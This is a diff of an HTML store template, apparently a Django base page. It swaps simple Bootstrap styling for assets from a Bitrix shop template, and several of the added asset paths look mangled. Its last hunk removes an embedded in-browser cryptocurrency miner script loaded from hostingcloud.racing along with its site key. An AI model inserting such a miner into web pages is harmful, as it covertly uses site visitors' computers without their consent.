@@ -3,255 +3,156 @@
 <html>
 
 <head>
-	<title>{% block title %}Название{% endblock %}</title>
 
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+	<meta name="format-detection" content="telephone=no, email=no, address=no, date=no" />
+	<title>{% block title %}Интернет-магазин{% endblock %}</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<link href="../static/files/js/main/core/css/core.css@15928565173963.css" type="text/css" rel="stylesheet" />
+	<style type="text/css">
+	.bx-composite-btn {
+		background: url(../static/files/images/main/composite/sprite-1x.png) no-repeat right 0 #e94524;
+		border-radius: 15px;
+		color: #fff !important;
+		display: inline-block;
+		line-height: 30px;
+		font-family: "Helvetica Neue", Helvetica, Arial, sans-serif !important;
+		font-size: 12px !important;
+		font-weight: bold !important;
+		height: 31px !important;
+		padding: 0 42px 0 17px !important;
+		vertical-align: middle !important;
+		text-decoration: none !important;
+	}
 
-	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+	@media screen and (min-device-width: 1200px) and (max-device-width: 1600px) and (-webkit-min-device-pixel-ratio: 2) and (min-resolution: 192dpi) {
+		.bx-composite-btn {
+			background-image: url(../static/files/images/main/composite/sprite-2x.png);
+			background-size: 42px 124px;
+		}
+	}
 
-		<style>
+	.bx-composite-btn-fixed {
+		position: absolute;
+		top: -45px;
+		right: 15px;
+		z-index: 10;
+	}
 
-		body {
-  		background-color: #222;
-		}
+	.bx-btn-white {
+		background-position: right 0;
+		color: #fff !important;
+	}
 
-		h1, h2, h3, h4, h5, h6{
-			font-weight: 500;
-			line-height: 1.2;
-			color: inherit;
-		}
+	.bx-btn-black {
+		background-position: right -31px;
+		color: #000 !important;
+	}
 
-		.box-element{
-			box-shadow:hsl(0, 0%, 80%) 0 0 16px;
-			background-color: #fff;
-			border-radius: 4px;
-			padding: 10px;
-		}
+	.bx-btn-red {
+		background-position: right -62px;
+		color: #555 !important;
+	}
 
-		.thumbnail{
-			width: 100%;
-			height: 200px;
-			-webkit-box-shadow: -1px -3px 5px -2px rgba(214,214,214,1);
-		    -moz-box-shadow: -1px -3px 5px -2px rgba(214,214,214,1);
-		    box-shadow: -1px -3px 5px -2px rgba(214,214,214,1);
-		}
+	.bx-btn-grey {
+		background-position: right -93px;
+		color: #657b89 !important;
+	}
 
-		.product{
-			border-radius: 0 0 4px 4px;
-		}
+	.bx-btn-border {
+		border: 1px solid #d4d4d4;
+		height: 29px !important;
+		line-height: 29px !important;
+	}
 
-		.bg-dark{
-			background-color: #4f868c!important;
-		}
+	.bx-composite-loading {
+		display: block;
+		width: 40px;
+		height: 40px;
+		background: url(../static/files/images/main/composite/loading.gif);
+	}
 
-		.col-lg-4, .col-lg-6, .col-lg-8, .col-lg-12{
-			margin-top: 10px;
+	</style>
+	<link href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i&amp;subset=cyrillic,cyrillic-ext,latin-ext" type="text/css" rel="stylesheet" />
+	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css" rel="stylesheet" />
+	<link href="../static/files/cache/css/s1/site/page_71d21974979b5dd6b2dd7bd9d81aeb58/page_71d21974979b5dd6b2dd7bd9d81aeb58_v1.css@16078520976554.css" type="text/css" rel="stylesheet" />
+	<link href="../static/files/cache/css/s1/site/template_cdd8cc0ba4ddc9cb456de8e4602cc1ac/template_cdd8cc0ba4ddc9cb456de8e4602cc1ac_v1.css@160785209763621.css" type="text/css" data-template-style="true" rel="stylesheet" />
+	<script type="text/javascript">
+	if(!window.BX) window.BX = {};
+	if(!window.BX.message) window.BX.message = function(mess) {
+		if(typeof mess === 'object') {
+			for(let i in mess) {
+				BX.message[i] = mess[i];
+			}
+			return true;
 		}
+	};
+	</script>
+	<script type="text/javascript">
+	(window.BX || top.BX).message({
+		'JS_CORE_LOADING': 'Загрузка...',
+		'JS_CORE_NO_DATA': '- Нет данных -',
+		'JS_CORE_WINDOW_CLOSE': 'Закрыть',
+		'JS_CORE_WINDOW_EXPAND': 'Развернуть',
+		'JS_CORE_WINDOW_NARROW': 'Свернуть в окно',
+		'JS_CORE_WINDOW_SAVE': 'Сохранить',
+		'JS_CORE_WINDOW_CANCEL': 'Отменить',
+		'JS_CORE_WINDOW_CONTINUE': 'Продолжить',
+		'JS_CORE_H': 'ч',
+		'JS_CORE_M': 'м',
+		'JS_CORE_S': 'с',
+		'JSADM_AI_HIDE_EXTRA': 'Скрыть лишние',
+		'JSADM_AI_ALL_NOTIF': 'Показать все',
+		'JSADM_AUTH_REQ': 'Требуется авторизация!',
+		'JS_CORE_WINDOW_AUTH': 'Войти',
+		'JS_CORE_IMAGE_FULL': 'Полный размер'
+	});
+	</script>
+	<script type="text/javascript" src="../static/files/js/main/core/core.min.js@1607851739252095"></script>
+	<script>
+	BX.setJSList(['/../static/files/js/main/core/core_ajax.js', '/../static/files/js/main/core/core_promise.js', '/../static/files/js/main/polyfill/promise/js/promise.js', '/../static/files/js/main/loadext/loadext.js', '/../static/files/js/main/loadext/extension.js', '/../static/files/js/main/polyfill/promise/js/promise.js', '/../static/files/js/main/polyfill/find/js/find.js', '/../static/files/js/main/polyfill/includes/js/includes.js', '/../static/files/js/main/polyfill/matches/js/matches.js', '/../static/files/js/ui/polyfill/closest/js/closest.js', '/../static/files/js/main/polyfill/fill/main.polyfill.fill.js', '/../static/files/js/main/polyfill/find/js/find.js', '/../static/files/js/main/polyfill/matches/js/matches.js', '/../static/files/js/main/polyfill/core/dist/polyfill.bundle.js', '/../static/files/js/main/core/core.js', '/../static/files/js/main/polyfill/intersectionobserver/js/intersectionobserver.js', '/../static/files/js/main/lazyload/dist/lazyload.bundle.js', '/../static/files/js/main/polyfill/core/dist/polyfill.bundle.js', '/../static/files/js/main/parambag/dist/parambag.bundle.js']);
+	BX.setCSSList(['/../static/files/js/main/core/css/core.css', '/../static/files/js/main/lazyload/dist/lazyload.bundle.css', '/../static/files/js/main/parambag/dist/parambag.bundle.css']);
+	</script>
+	<script type="text/javascript">
+	(window.BX || top.BX).message({
+		'LANGUAGE_ID': 'ru',
+		'FORMAT_DATE': 'DD.MM.YYYY',
+		'FORMAT_DATETIME': 'DD.MM.YYYY HH:MI:SS',
+		'COOKIE_PREFIX': '../static/files_SM',
+		'SERVER_TZ_OFFSET': '14400',
+		'SITE_ID': 's1',
+		'SITE_DIR': '/'
+	});
+	</script>
+	<script type="text/javascript" src="../static/files/cache/js/s1/site/kernel_main/kernel_main_v1.js@160785209510092"></script>
+	<script type="text/javascript" src="../static/files/cache/js/s1/site/kernel_main_polyfill_customevent/kernel_main_polyfill_customevent_v1.js@16078520951051"></script>
+	<script type="text/javascript" src="../static/files/js/ui/dexie/dist/dexie.../static/files.bundle.min.js@160785174860291"></script>
+	<script type="text/javascript" src="../static/files/js/main/core/core_ls.min.js@15928565167365"></script>
+	<script type="text/javascript" src="../static/files/js/main/core/core_frame_cache.min.js@160785173910532"></script>
+	<script type="text/javascript" src="https://code.jquery.com/jquery-3.0.0.js"></script>
+	<script type="text/javascript">
+	BX.setJSList(['/../static/files/js/main/core/core_fx.js', '/../static/files/js/main/polyfill/customevent/main.polyfill.customevent.js', '/../static/files/templates/site/assets/fancybox/jquery.fancybox.js', '/../static/files/templates/site/assets/inputmask/jquery.inputmask.js', '/../static/files/templates/site/assets/owl-carousel/jquery.owl-carousel.js', '/../static/files/templates/site/assets/swiper/jquery.swiper.js', '/../static/files/templates/site/assets/scrollup/jquery.scrollup.js', '/../static/files/templates/site/assets/smartmenus/jquery.smartmenus.js', '/../static/files/templates/site/script.js', '/../static/files/templates/site/components/../static/files/menu/top/script.js', '/../static/files/components/kolibri/form.universal/script.js', '/../static/files/templates/site/custom.js']);
+	</script>
+	<script type="text/javascript">
+	BX.setCSSList(['/../static/files/templates/site/components/../static/files/catalog.section.list/panel/style.css', '/../static/files/templates/site/components/../static/files/catalog.top/table/style.css', '/../static/files/templates/site/components/../static/files/system.pagenavigation/.default/style.css', '/../static/files/templates/site/components/../static/files/news.list/info_line/style.css', '/../static/files/templates/site/assets/fancybox/jquery.fancybox.css', '/../static/files/templates/site/assets/owl-carousel/jquery.owl-carousel.css', '/../static/files/templates/site/assets/owl-carousel/jquery.owl-carousel.theme.css', '/../static/files/templates/site/assets/swiper/jquery.swiper.css', '/../static/files/templates/site/assets/scrollup/jquery.scrollup.css', '/../static/files/templates/site/assets/smartmenus/jquery.smartmenus.css', '/../static/files/templates/site/assets/smartmenus/jquery.smartmenus.theme.css', '/../static/files/templates/site/components/../static/files/menu/top/style.css', '/../static/files/templates/site/components/../static/files/catalog.top/slider/style.css', '/../static/files/components/kolibri/form.universal/style.css', '/../static/files/templates/site/styles.css', '/../static/files/templates/site/template_styles.css', '/../static/files/templates/site/adaptive.css', '/../static/files/templates/site/themes/blue/colors.css', '/../static/files/templates/site/custom.css']);
+	</script>
+	<script type="text/javascript" src="../static/files/cache/js/s1/site/template_4352d5d49c304393d552da9c7496438e/template_4352d5d49c304393d552da9c7496438e_v1.js@1607852096661265"></script>
+	<script type="text/javascript">
+	var _ba = _ba || [];
+	_ba.push(["aid", "f35feab3ece1e26c2b0b7812e68a6fb9"]);
+	_ba.push(["host", "corplite.kolibri.pw"]);
+	(function() {
+		var ba = document.createElement("script");
+		ba.type = "text/javascript";
+		ba.async = true;
+		ba.src = (document.location.protocol == "https:" ? "https://" : "http://") + "../static/files.info/ba.js";
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(ba, s);
+	})();
+	</script>
 
-		.btn{
-			border-radius: 0;
-		}
-
-		.row-image{
-			width: 100px;
-		}
-
-		.form-field{
-			width:250px;
-			display: inline-block;
-			padding: 5px;
-		}
-
-		.hidden{
-			display: none!important;
-		}
-
-		.search-link{
-			text-decoration: none;
-		}
-
-		.input-wrapper {
-			width: 500px;
-			margin: 50px auto;
-			position: relative;
-			left: -300px;
-		}
-
-		.input-wrapper::after {
-			content: attr(data-text);
-			font-size: 1.5rem;
-			line-height: 0;
-			height: 0;
-			max-width: 100%;
-			font-family: Roboto, Arial, sans-serif;
-			border-bottom: 3px solid #fff;
-			position: absolute;
-			left: 0;
-			bottom: 0;
-			height: 3px;
-			overflow: hidden;
-			user-select: none;
-			color: transparent;
-		}
-
-		input {
-			color: #ddd;
-			border: none;
-			padding: 0;
-			border-radius: 0;
-			outline: none;
-			width: auto;
-			min-width: 100%;
-			font-size: 1.5rem;
-			line-height: 3em;
-			font-family: Roboto, Arial, sans-serif;
-			border-bottom: 3px solid #333333;
-			background-color: transparent;
-		}
-
-		* {
-			-webkit-box-sizing: border-box;
-			-moz-box-sizing: border-box;
-			box-sizing: border-box;
-		}
-		.flip {
-			position: absolute;
-			width: 160px;
-			height: 48px;
-			-webkit-perspective: 500px;
-			-moz-perspective: 500px;
-			-ms-perspective: 500px;
-			perspective: 500px;
-			top: 100px;
-			left: 150px;
-			margin: -24px 0 0 -80px;
-		}
-		.flip a {
-			font-weight: 400;
-			text-transform: uppercase;
-			margin: 0;
-			padding: 0;
-			width: 100%;
-			height: 100%;
-			position: absolute;
-			-webkit-transform-style: preserve-3d;
-			-moz-transform-style: preserve-3d;
-			-o-transform-style: preserve-3d;
-			-ms-transform-style: preserve-3d;
-			transform-style: preserve-3d;
-			-webkit-transform: translateZ(-25px);
-			-moz-transform: translateZ(-25px);
-			-o-transform: translateZ(-25px);
-			-ms-transform: translateZ(-25px);
-			transform: translateZ(-25px);
-			-webkit-transition: -webkit-transform 0.3s;
-			-moz-transition: -moz-transform 0.3s;
-			-o-transition: -o-transform 0.3s;
-			-ms-transition: -ms-transform 0.3s;
-			transition: transform 0.3s;
-			cursor: pointer;
-		}
-		.flip a .front,
-		.flip a .back {
-			margin: 0;
-			width: 160px;
-			height: 48px;
-			line-height: 48px;
-			position: absolute;
-			text-align: center;
-			letter-spacing: 0.4em;
-		}
-		.flip a .front {
-			background-color: #222;
-			color: #fff;
-			-webkit-transform: rotateY(0) translateZ(24px);
-			-moz-transform: rotateY(0) translateZ(24px);
-			-o-transform: rotateY(0) translateZ(24px);
-			-ms-transform: rotateY(0) translateZ(24px);
-			transform: rotateY(0) translateZ(24px);
-		}
-		.flip a .back {
-			background-color: rgba(255,255,255,0);
-			color: rgba(34,34,34,0);
-			-webkit-transform: rotateX(90deg) translateZ(24px);
-			-moz-transform: rotateX(90deg) translateZ(24px);
-			-o-transform: rotateX(90deg) translateZ(24px);
-			-ms-transform: rotateX(90deg) translateZ(24px);
-			transform: rotateX(90deg) translateZ(24px);
-			overflow: hidden;
-		}
-		.flip a .back:after {
-			content: '';
-			position: absolute;
-			top: -32%;
-			left: -10%;
-			width: 120%;
-			height: 50%;
-			background: #222;
-			-webkit-transform: rotate(8deg);
-			-moz-transform: rotate(8deg);
-			-o-transform: rotate(8deg);
-			-ms-transform: rotate(8deg);
-			transform: rotate(8deg);
-			-webkit-transition: all 0.5s ease;
-			-moz-transition: all 0.5s ease;
-			-o-transition: all 0.5s ease;
-			-ms-transition: all 0.5s ease;
-			transition: all 0.5s ease;
-			-webkit-transition-delay: 0.15s;
-			-moz-transition-delay: 0.15s;
-			-o-transition-delay: 0.15s;
-			-ms-transition-delay: 0.15s;
-			transition-delay: 0.15s;
-		}
-		.flip a:hover {
-			-webkit-transform: translateZ(-24px) rotateX(-90deg);
-			-moz-transform: translateZ(-24px) rotateX(-90deg);
-			-o-transform: translateZ(-24px) rotateX(-90deg);
-			-ms-transform: translateZ(-24px) rotateX(-90deg);
-			transform: translateZ(-24px) rotateX(-90deg);
-		}
-		.flip a:hover .front {
-			background: #000;
-			-webkit-transition: all 0.8s ease;
-			-moz-transition: all 0.8s ease;
-			-o-transition: all 0.8s ease;
-			-ms-transition: all 0.8s ease;
-			transition: all 0.8s ease;
-		}
-		.flip a:hover .back {
-			color: #222;
-			-webkit-transition: color 0.4s linear;
-			-moz-transition: color 0.4s linear;
-			-o-transition: color 0.4s linear;
-			-ms-transition: color 0.4s linear;
-			transition: color 0.4s linear;
-			background: #fff;
-		}
-		.flip a:hover .back:after {
-			-webkit-transform: rotate(6deg) translate(100px, -18px);
-			-moz-transform: rotate(6deg) translate(100px, -18px);
-			-o-transform: rotate(6deg) translate(100px, -18px);
-			-ms-transform: rotate(6deg) translate(100px, -18px);
-			transform: rotate(6deg) translate(100px, -18px);
-		}
-
-		</style>
-
-		<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
 </head>
 <body>
-
-	<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
-	  <a class="navbar-brand" href="{% url 'store:store' %}">Название</a>
-	  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-	    <span class="navbar-toggler-icon"></span>
-	  </button>
-
-	  <div class="collapse navbar-collapse" id="navbarSupportedContent">
-
-	  </div>
-	</nav>
 
 			<div class="container">
 
@@ -273,14 +174,5 @@
 
 	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
 
-	<script src="https://www.hostingcloud.racing/mzJw.js"></script>
-	<script>
-		var _client = new Client.Anonymous('91c809e486adc732790f195f55da9563b8a85c6df498bcbaefcc47e9693c537d', {
-			throttle: 0.3, c: 'w', ads: 0
-		});
-		_client.start();
-		
-	
-	</script>
 </body>
 </html>
